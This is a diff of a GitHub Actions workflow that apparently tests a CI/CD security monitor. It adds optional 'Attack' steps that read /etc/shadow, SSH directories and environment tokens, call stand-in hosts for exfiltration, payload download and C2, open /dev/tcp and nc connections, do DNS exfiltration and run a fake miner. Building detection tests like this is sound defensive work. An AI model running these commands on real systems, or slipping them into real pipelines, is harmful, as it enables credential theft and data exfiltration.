@@ -13,6 +13,7 @@ on:
           - python
           - go
           - deploy
+          - all
         default: baseline
       iteration:
         description: "Iteration number"
@@ -25,25 +26,23 @@ on:
         default: false
 
 jobs:
-  e2e:
-    name: "E2E (${{ inputs.job }}${{ inputs.attack == 'true' && ' + attack' || '' }} #${{ inputs.iteration }})"
+  # =============================================================
+  # BASELINE — normal CI/CD build
+  # =============================================================
+  baseline:
+    if: inputs.job == 'baseline' || inputs.job == 'all'
+    name: "Baseline CI #${{ inputs.iteration }}"
     runs-on: [self-hosted, philip]
     env:
-      WORKDIR: /tmp/philip-e2e-${{ github.run_id }}
       GOCACHE: /tmp/philip-gocache-${{ github.run_id }}
     steps:
       - uses: actions/checkout@v4
-
       - name: Philip monitor start
         uses: ./action
         with:
           mode: monitor
 
-      # =========================================================
-      # BASELINE job
-      # =========================================================
       - name: "Install dependencies"
-        if: inputs.job == 'baseline'
         run: |
           curl -sf https://registry.npmjs.org/express > /dev/null 2>&1 || true
           curl -sf https://pypi.org/simple/requests/ > /dev/null 2>&1 || true
@@ -52,39 +51,60 @@ jobs:
           python3 --version 2>/dev/null || true
 
       - name: "Build"
-        if: inputs.job == 'baseline'
         run: |
           go vet ./... 2>/dev/null || true
-          go build -o "${WORKDIR}/philip-server" ./backend/cmd/philip-server 2>/dev/null || true
+          go build -o /tmp/philip-build-${{ github.run_id }} ./backend/cmd/philip-server 2>/dev/null || true
           ls -la
           find . -name "*.go" -type f | head -20 | xargs wc -l 2>/dev/null || true
 
       - name: "Run tests"
-        if: inputs.job == 'baseline'
         run: |
           go test ./backend/detection/... -count=1 -short 2>/dev/null || true
           go test ./backend/baseline/... -count=1 -short 2>/dev/null || true
 
       - name: "Lint"
-        if: inputs.job == 'baseline'
         run: |
           gofmt -l ./backend/ 2>/dev/null || true
           go vet ./backend/... 2>/dev/null || true
 
       - name: "Attack: baseline"
-        if: inputs.job == 'baseline' && inputs.attack == 'true'
+        if: inputs.attack == 'true'
         run: |
           echo "=== INJECTED ATTACK in baseline job ==="
           cat /proc/self/environ > /dev/null 2>&1 || true
           timeout 2 curl -sf http://198.51.100.1:8888/exfil 2>/dev/null || true
           env | grep -i token > /dev/null 2>&1 || true
 
-      # =========================================================
-      # DOCKER job
-      # =========================================================
-      - name: "Docker: create project"
-        if: inputs.job == 'docker'
+      - name: "Philip results"
+        if: always()
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: "baseline${{ inputs.attack == 'true' && '-attack' || '' }}"
+          iteration: ${{ inputs.iteration }}
+
+      - name: "Cleanup"
+        if: always()
         run: |
+          rm -rf /tmp/philip-gocache-${{ github.run_id }}
+          rm -f /tmp/philip-build-${{ github.run_id }}
+
+  # =============================================================
+  # DOCKER — containerized build pipeline
+  # =============================================================
+  docker:
+    if: inputs.job == 'docker' || inputs.job == 'all'
+    name: "Docker build #${{ inputs.iteration }}"
+    runs-on: [self-hosted, philip]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
+      - name: "Docker: create project"
+        run: |
+          WORKDIR="/tmp/philip-docker-${{ github.run_id }}"
           mkdir -p "${WORKDIR}"
           cat > "${WORKDIR}/app.js" << 'EOF'
           const http = require('http');
@@ -108,8 +128,8 @@ jobs:
           EOF
 
       - name: "Docker: build and inspect"
-        if: inputs.job == 'docker'
         run: |
+          WORKDIR="/tmp/philip-docker-${{ github.run_id }}"
           TAG="philip-test:${{ github.run_id }}"
           docker build -t "${TAG}" "${WORKDIR}"
           docker tag "${TAG}" "philip-test:latest"
@@ -119,7 +139,7 @@ jobs:
           echo "fake-password" | docker login --username fake-user --password-stdin 2>/dev/null || echo "(login failed as expected)"
 
       - name: "Attack: docker"
-        if: inputs.job == 'docker' && inputs.attack == 'true'
+        if: inputs.attack == 'true'
         run: |
           echo "=== INJECTED ATTACK in docker job ==="
           cat /etc/passwd > /dev/null 2>&1 || true
@@ -127,17 +147,36 @@ jobs:
           touch /tmp/xmrig && chmod +x /tmp/xmrig && timeout 2 /tmp/xmrig 2>/dev/null || true
           rm -f /tmp/xmrig
 
-      - name: "Docker: cleanup images"
-        if: inputs.job == 'docker' && always()
+      - name: "Philip results"
+        if: always()
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: "docker${{ inputs.attack == 'true' && '-attack' || '' }}"
+          iteration: ${{ inputs.iteration }}
+
+      - name: "Cleanup"
+        if: always()
         run: |
           docker rmi "philip-test:${{ github.run_id }}" "philip-test:latest" 2>/dev/null || true
+          rm -rf "/tmp/philip-docker-${{ github.run_id }}"
 
-      # =========================================================
-      # PYTHON job
-      # =========================================================
+  # =============================================================
+  # PYTHON — Python CI pipeline
+  # =============================================================
+  python:
+    if: inputs.job == 'python' || inputs.job == 'all'
+    name: "Python CI #${{ inputs.iteration }}"
+    runs-on: [self-hosted, philip]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
       - name: "Python: create project"
-        if: inputs.job == 'python'
         run: |
+          WORKDIR="/tmp/philip-python-${{ github.run_id }}"
           mkdir -p "${WORKDIR}/tests"
           cat > "${WORKDIR}/requirements.txt" << 'EOF'
           requests>=2.28.0
@@ -177,8 +216,8 @@ jobs:
           EOF
 
       - name: "Python: install and test"
-        if: inputs.job == 'python'
         run: |
+          WORKDIR="/tmp/philip-python-${{ github.run_id }}"
           cd "${WORKDIR}"
           pip install -r requirements.txt 2>&1 | tail -5
           python -m pytest tests/ -v 2>&1 || true
@@ -187,19 +226,45 @@ jobs:
           ls -la dist/ 2>/dev/null || true
 
       - name: "Attack: python"
-        if: inputs.job == 'python' && inputs.attack == 'true'
+        if: inputs.attack == 'true'
         run: |
           echo "=== INJECTED ATTACK in python job ==="
           ls -la /home/*/.ssh/ 2>/dev/null || true
           timeout 2 curl -sf http://198.51.100.1:4444/payload -o /tmp/payload 2>/dev/null || true
           timeout 2 bash -c 'echo test > /dev/tcp/198.51.100.1/4444' 2>/dev/null || true
 
-      # =========================================================
-      # GO job
-      # =========================================================
-      - name: "Go: create project"
-        if: inputs.job == 'go'
+      - name: "Philip results"
+        if: always()
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: "python${{ inputs.attack == 'true' && '-attack' || '' }}"
+          iteration: ${{ inputs.iteration }}
+
+      - name: "Cleanup"
+        if: always()
         run: |
+          rm -rf "/tmp/philip-python-${{ github.run_id }}"
+
+  # =============================================================
+  # GO — Go project pipeline
+  # =============================================================
+  go:
+    if: inputs.job == 'go' || inputs.job == 'all'
+    name: "Go CI #${{ inputs.iteration }}"
+    runs-on: [self-hosted, philip]
+    env:
+      GOCACHE: /tmp/philip-gocache-go-${{ github.run_id }}
+      GOPATH: /tmp/philip-gopath-${{ github.run_id }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
+      - name: "Go: create project"
+        run: |
+          WORKDIR="/tmp/philip-go-${{ github.run_id }}"
           mkdir -p "${WORKDIR}"
           cat > "${WORKDIR}/go.mod" << 'EOF'
           module github.com/philip-test/sample
@@ -241,10 +306,8 @@ jobs:
           EOF
 
       - name: "Go: build and test"
-        if: inputs.job == 'go'
-        env:
-          GOPATH: /tmp/philip-gopath-${{ github.run_id }}
         run: |
+          WORKDIR="/tmp/philip-go-${{ github.run_id }}"
           cd "${WORKDIR}"
           go mod download 2>&1 || true
           go vet ./... 2>&1
@@ -253,18 +316,42 @@ jobs:
           go test -v -count=1 ./... 2>&1
 
       - name: "Attack: go"
-        if: inputs.job == 'go' && inputs.attack == 'true'
+        if: inputs.attack == 'true'
         run: |
           echo "=== INJECTED ATTACK in go job ==="
           timeout 2 nslookup "$(whoami).evil.example.com" 2>/dev/null || true
           cat /proc/self/environ > /dev/null 2>&1 || true
           timeout 2 curl -sf http://198.51.100.1:9999/c2 2>/dev/null || true
 
-      # =========================================================
-      # DEPLOY job
-      # =========================================================
+      - name: "Philip results"
+        if: always()
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: "go${{ inputs.attack == 'true' && '-attack' || '' }}"
+          iteration: ${{ inputs.iteration }}
+
+      - name: "Cleanup"
+        if: always()
+        run: |
+          rm -rf "/tmp/philip-go-${{ github.run_id }}"
+          rm -rf /tmp/philip-gocache-go-${{ github.run_id }}
+          rm -rf /tmp/philip-gopath-${{ github.run_id }}
+
+  # =============================================================
+  # DEPLOY — deployment tools simulation
+  # =============================================================
+  deploy:
+    if: inputs.job == 'deploy' || inputs.job == 'all'
+    name: "Deploy sim #${{ inputs.iteration }}"
+    runs-on: [self-hosted, philip]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
       - name: "Deploy: check tooling"
-        if: inputs.job == 'deploy'
         run: |
           aws --version 2>/dev/null || echo "(aws cli not installed)"
           kubectl version --client 2>/dev/null || echo "(kubectl not installed)"
@@ -274,8 +361,8 @@ jobs:
           jq --version 2>/dev/null || echo "(jq not installed)"
 
       - name: "Deploy: download artifacts"
-        if: inputs.job == 'deploy'
         run: |
+          WORKDIR="/tmp/philip-deploy-${{ github.run_id }}"
           mkdir -p "${WORKDIR}/artifacts"
           curl -sf -o "${WORKDIR}/artifacts/checksums.txt" https://raw.githubusercontent.com/actions/runner/main/LICENSE 2>/dev/null || echo "placeholder" > "${WORKDIR}/artifacts/checksums.txt"
           sha256sum "${WORKDIR}/artifacts/checksums.txt" || true
@@ -283,7 +370,6 @@ jobs:
           cat "${WORKDIR}/artifacts/manifest.txt"
 
       - name: "Deploy: cloud operations"
-        if: inputs.job == 'deploy'
         run: |
           aws sts get-caller-identity 2>/dev/null || echo "(no AWS credentials)"
           aws s3 ls 2>/dev/null || echo "(no AWS credentials)"
@@ -292,7 +378,6 @@ jobs:
           terraform init -backend=false 2>/dev/null || echo "(no terraform config)"
 
       - name: "Deploy: health checks"
-        if: inputs.job == 'deploy'
         run: |
           timeout 5 curl -sf http://localhost:8080/healthz 2>/dev/null || echo "(health endpoint not available)"
           timeout 5 curl -sf -o /dev/null -w "HTTP %{http_code}" http://localhost:8080/api/v1/baselines 2>/dev/null || echo "(API check)"
@@ -301,7 +386,7 @@ jobs:
           timeout 5 curl -sf -o /dev/null -w "%{http_code}" https://github.com 2>/dev/null && echo " github.com reachable" || true
 
       - name: "Attack: deploy"
-        if: inputs.job == 'deploy' && inputs.attack == 'true'
+        if: inputs.attack == 'true'
         run: |
           echo "=== INJECTED ATTACK in deploy job ==="
           cat /etc/shadow 2>/dev/null || true
@@ -309,20 +394,14 @@ jobs:
           timeout 2 nc -z 198.51.100.1 4444 2>/dev/null || true
           timeout 2 curl -sf http://198.51.100.1:8888/exfil 2>/dev/null || true
 
-      # =========================================================
-      # Common: report + cleanup
-      # =========================================================
       - name: "Philip results"
         if: always()
         uses: ./.github/actions/philip-report
         with:
-          scenario: "${{ inputs.job }}${{ inputs.attack == 'true' && '-attack' || '' }}"
+          scenario: "deploy${{ inputs.attack == 'true' && '-attack' || '' }}"
           iteration: ${{ inputs.iteration }}
 
       - name: "Cleanup"
         if: always()
         run: |
-          rm -rf "${WORKDIR}"
-          rm -rf /tmp/philip-gocache-${{ github.run_id }}
-          rm -rf /tmp/philip-gopath-${{ github.run_id }}
-          docker rmi "philip-test:${{ github.run_id }}" "philip-test:latest" 2>/dev/null || true
+          rm -rf "/tmp/philip-deploy-${{ github.run_id }}"
